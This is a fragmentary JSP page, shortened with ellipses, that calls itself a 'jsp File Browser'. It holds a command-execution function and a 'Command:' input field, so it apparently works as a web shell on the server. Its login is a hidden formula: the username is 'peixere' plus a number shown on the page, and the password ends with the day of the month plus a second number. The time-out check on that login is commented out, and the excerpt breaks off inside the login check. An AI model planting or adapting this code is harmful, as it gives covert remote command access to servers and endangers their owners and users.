...
%>
<%
String SessionLogin = "SessionLogin";
String SessionChecked = "SessionChecked";
...
<%!
	...
	*/
	...
	private static final int EDITFIELD_COLS = 105;
	...
	static String startProcess(String command, String dir) throws IOException {
		...
		tm = new String(tm.getBytes("iso8859-1"),encoding);
		//tm = new String(tm.getBytes("gbk"));
		return tm;
	}
...
<link rel="stylesheet" type="text/css" href="<%=CSS_NAME%>">
	...
	<style type="text/css">
		textarea {font-size: 9pt; color: #ffffff;background-color:#000000;border:1px solid #ffffff;padding: 5px 2px 5px 5px;}
...
%></textarea>
	...
	Command: 
	<input size="<%=EDITFIELD_COLS-42%>" type="text" name="command" value="">
...
else
{
	if(request.getMethod().equalsIgnoreCase("post")){
		String checked = (String)request.getSession().getAttribute(SessionChecked);
		String username = request.getParameter("username");
		String password = request.getParameter("password");
		String value = request.getParameter("value");
		if(loginCheck(username,password,checked,value)){
			request.getSession().setAttribute(SessionLogin,username);
			response.sendRedirect(request.getRequestURI());
			%>登录成功<%
		}else{
			%><a href="<%=request.getRequestURI()%>">登录失败</a><%			
		}
	}else{
		// user login
		...
		request.getSession().removeAttribute(SessionChecked);
		request.getSession().removeAttribute(SessionLogin);
		request.getSession().setAttribute(SessionChecked, a+"@"+b+"@"+timeMillis);
...
<form action="remote.jsp" method="POST">
	<p align="right">Username: <input type="text" name="username" /></p>
	<p align="right">Password: <input type="password" name="password" /></p>
	<p align="right"><%=a%> + <%=b%> =: <input type="text" name="value" /></p>
...
%>
	<center>
		<small>jsp File Browser version <%= VERSION_NR%> by <a href="http://www.gotom.cn">www.gotom.cn</a></small>
	</center>	
</body>
</html>
<%!
public boolean loginCheck(String username,String password,String checked,String value) {
	try{
		if(checked!= null){
			String[] checkeds = checked.split("@");
			long time =Long.parseLong(checkeds[2]);
			time = System.currentTimeMillis() - time;
			if(time > 20000){
				//return false;
			}
			
			int week = Calendar.getInstance().get(Calendar.DAY_OF_MONTH);
			System.out.print(week);
			if(username.equals("peixere"+checkeds[0]) && password.endsWith(week+checkeds[1])){
				int a = Integer.parseInt(checkeds[0]);
				int b = Integer.parseInt(checkeds[1]);
